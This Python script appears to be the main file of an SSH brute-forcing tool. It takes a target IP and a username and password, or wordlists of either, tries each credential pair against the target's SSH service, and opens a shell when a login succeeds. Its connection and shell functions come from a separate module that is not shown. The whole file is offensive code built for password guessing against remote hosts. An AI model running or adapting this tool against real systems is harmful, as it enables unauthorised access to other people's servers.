#!/usr/bin/python3

import argparse

from ssh_connect import *

# Brute forcing
def main():
	parser = argparse.ArgumentParser()

	# Common for all brute forcing types
	parser.add_argument("-ip", help="Specify Target ip")

	# passwd brute forcing help section
	parser.add_argument("-u", "--user", help="Specify Target Username")
	parser.add_argument("-p_file", help="Specify wordlist file for passwd bruteforce ")

	# user brute forcing help section
	parser.add_argument("-u_file", help="Specify wordlist file for user bruteforce")
	parser.add_argument("-p", "--passwd", help="Specify password for Target User")

	args = parser.parse_args()

	# Passwd brute forcing section
	if args.ip and args.user and args.p_file:

		with open(args.p_file, 'r') as lines:

				startTime = time.time()

				for line in lines: # reading a line from lines in file
					passwd = line.strip("\r\n")

					print(color_obj.WHITE+"[*] Testing: ", args.user+":"+str(passwd)+color_obj.ENDC)

					conn = connect(args.ip, args.user, passwd) # ssh connect

					# Getting shell after connecting to ssh
					shell_getting(args.user, args.ip, conn, startTime)


	# Username brute forcing section
	elif args.ip and args.u_file and args.passwd:

		with open(args.u_file, 'r') as lines:

			startTime = time.time()

			for line in lines: # reading a line from lines in file
				user = line.strip("\r\n")

				print(color_obj.WHITE+"[*] Testing: ", str(user)+":"+args.passwd+color_obj.ENDC)

				conn = connect(args.ip, user, args.passwd) # ssh connect

				# Getting shell after connecting to ssh
				shell_getting(user, args.ip, conn, startTime)

	# Brute forcing both creds
	elif args.ip and args.u_file and args.p_file:
		with open(args.u_file, 'r') as lines1:

			startTime = time.time()

			for line in lines1: # reading a line from lines in file
				user = line.strip("\r\n")

				with open(args.p_file, 'r') as lines2:
					for line in lines2:
						passwd = line.strip("\r\n")

						print(color_obj.WHITE+"[*] Testing: ", str(user)+":"+str(passwd)+color_obj.ENDC)

						conn = connect(args.ip, user, passwd) # ssh connect

						# Getting shell after connecting to ssh
						shell_getting(user, args.ip, conn, startTime)

	# Knowing both creds
	elif  args.ip and args.user and args.passwd:

		startTime = time.time()

		print(color_obj.GREEN+"[+] Provided creds are the correct creds!\n"+color_obj.ENDC)
		conn = connect(args.ip, args.user, args.passwd) # ssh connect

		user = args.user

		# Getting shell after connecting to ssh
		shell_getting(user, args.ip, conn, startTime)


	else:
		print(parser.usage)
		exit(0)


banner()

if __name__ == '__main__':
	main()
